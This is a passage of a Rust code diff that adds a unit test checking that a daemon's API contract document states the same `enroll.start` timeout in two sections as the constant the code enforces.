+        assert!(RECONCILE_CLIENT_TIMEOUT > RECONCILE_PROCESS_TIMEOUT);
+        assert!(RECONCILE_PROCESS_TIMEOUT > SERVER_PROCESS_TIMEOUT);
+    }
+
+    /// The contract states `enroll.start`'s processing bound in two places,
+    /// section 2 and section 5.9, and both are the constant punard enforces:
+    /// a raised bound once left section 5.9 saying 60 s while section 2 and
+    /// the code said 70 s.
+    #[test]
+    fn the_contract_states_the_enroll_start_bound_the_daemon_enforces() {
+        let contract = include_str!("../../../docs/api/ipc.md");
+        let bound = ENROLL_START_PROCESS_TIMEOUT.as_secs();
+        let section = |heading: &str| {
+            let start = contract.find(heading).expect(heading);
+            let rest = &contract[start + heading.len()..];
+            let end = ["\n## ", "\n### "]
+                .iter()
+                .filter_map(|next| rest.find(next))
+                .min()
+                .unwrap_or(rest.len());
+            &rest[..end]
+        };
+        assert!(
+            section("## 2. Framing").contains(&format!(
+                "`enroll.start` (section 5.9) is processed\n  under a **{bound} s** bound"
+            )),
+            "section 2 must state the {bound} s bound"
+        );
+        let start = section("### 5.9 `enroll.start` (M5)");
+        let stated: Vec<&str> = start
+            .match_indices("Processed under the ")
+            .map(|(at, found)| {
+                let tail = &start[at + found.len()..];
+                &tail[..tail.find(' ').unwrap()]
+            })
+            .collect();
+        assert_eq!(
+            stated,
+            [bound.to_string().as_str()],
+            "section 5.9 must state the same bound"
+        );
     }
 
     // -- M4 typed results (contract sections 5.1, 5.6–5.8) ------------------
